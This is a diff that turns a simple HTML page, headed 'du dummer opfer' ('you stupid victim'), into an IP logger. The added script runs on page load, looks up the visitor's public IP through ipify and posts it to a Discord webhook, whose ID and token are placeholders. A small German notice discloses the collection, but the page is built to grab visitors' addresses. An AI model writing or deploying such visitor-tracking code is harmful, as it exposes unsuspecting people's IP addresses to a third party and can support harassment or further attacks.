@@ -5,25 +5,86 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Website</title>
+
     <style>
         body {
             margin: 0;
-            background-color: black;
+            min-height: 100vh;
+            background: black;
             display: flex;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+
+        main {
+            text-align: center;
+            padding: 20px;
         }
 
         h1 {
             color: red;
-            font-family: Arial, sans-serif;
             font-size: 48px;
-            text-align: center;
+        }
+
+        .notice {
+            color: #ff5555;
+            font-size: 14px;
+            max-width: 450px;
+            margin: 20px auto;
+            line-height: 1.6;
         }
     </style>
 </head>
+
 <body>
-    <h1>du dummer opfer</h1>
+    <main>
+        <h1>du dummer opfer</h1>
+
+        <p class="notice">
+            Hinweis: Diese Website erfasst deine öffentliche
+            IP-Adresse und sendet sie an einen Discord-Kanal
+            des Betreibers.
+        </p>
+    </main>
+
+    <script>
+        const WEBHOOK_URL =
+            "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN";
+
+        async function sendVisitorIP() {
+            try {
+                const response = await fetch(
+                    "https://api64.ipify.org?format=json"
+                );
+
+                if (!response.ok) {
+                    throw new Error("IP lookup failed");
+                }
+
+                const data = await response.json();
+
+                const form = new FormData();
+
+                form.append("payload_json", JSON.stringify({
+                    content:
+                        "🌐 Website Visit\nIP: `" + data.ip + "`"
+                }));
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: form
+                });
+
+                console.log("Webhook request attempted");
+
+            } catch (error) {
+                console.error("Logging error:", error);
+            }
+        }
+
+        window.addEventListener("load", sendVisitorIP);
+    </script>
 </body>
 </html>
